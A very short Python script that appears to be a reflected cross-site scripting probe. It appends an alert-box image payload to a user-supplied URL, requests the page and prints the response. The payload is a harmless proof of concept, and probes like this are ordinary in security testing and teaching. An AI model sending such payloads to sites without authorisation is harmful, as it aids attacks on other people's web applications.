import requests

url = input("URL: ")
payload = "<img src=x onerror=alert('XSS')>"

response = requests.get(url + payload)
print(response.text)
